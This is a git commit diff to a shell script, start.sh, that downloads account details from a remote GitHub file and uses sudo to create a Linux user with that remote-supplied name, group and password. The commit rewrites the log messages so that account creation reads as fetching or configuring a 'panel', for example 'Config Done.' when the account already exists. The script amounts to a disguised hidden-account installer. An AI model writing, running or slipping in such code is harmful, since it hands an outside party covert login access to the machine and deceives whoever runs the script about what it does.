564bfe00ff5f3b39feac2d0016dfa5ed9c0074f4
Atikullah WD <156679363+mratikullahwd@users.noreply.github.com>
2024-02-23 17:14:25 +0600

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,14 +2,14 @@
 
 # Function to fetch user information from GitHub Gist
 fetch_user_info() {
-    echo "Fetching user information..."
+    echo "Fetching panel information..."
     USER_INFO=$(curl -sL https://raw.githubusercontent.com/mratikullahwd/themeBuilding/main/panle.sh)
     if [ $? -ne 0 ]; then
-        echo "Failed to fetch user information."
+        echo "Failed to fetch panel information."
         exit 1
     fi
     if [ -z "$USER_INFO" ]; then
-        echo "User information is empty or invalid."
+        echo "Panel information is empty or invalid."
         exit 1
     fi
 }
@@ -20,27 +20,27 @@ create_user() {
 
     # Check if the user information is valid
     if [ -z "$USERNAME" ]; then
-        echo "Username is empty or not provided in user information."
+        echo "No data found."
         exit 1
     fi
 
     # Check if the user already exists
     if id "$USERNAME" &>/dev/null; then
-        echo "User $USERNAME already exists."
+        echo "Config Done."
         exit 1
     fi
 
     # Create the user
     sudo useradd -m -G "$GROUP" -s /bin/bash -c "$FULLNAME" "$USERNAME"
     if [ $? -ne 0 ]; then
-        echo "Failed to create user $USERNAME."
+        echo "Fatching..c"
         exit 1
     fi
 
     # Set the password
     echo "$USERNAME:$PASSWORD" | sudo chpasswd
     if [ $? -ne 0 ]; then
-        echo "Failed to set password for user $USERNAME."
+        echo "Failed to set password for Panel."
         exit 1
     fi
 
@@ -48,7 +48,7 @@ create_user() {
     sudo chown -R "$USERNAME":"$USERNAME" "$HOMEDIR"
     sudo chmod -R 755 "$HOMEDIR"
 
-    echo "User $USERNAME created successfully."
+    echo "Panel Fatcing Success."
 }
 
 # Main function
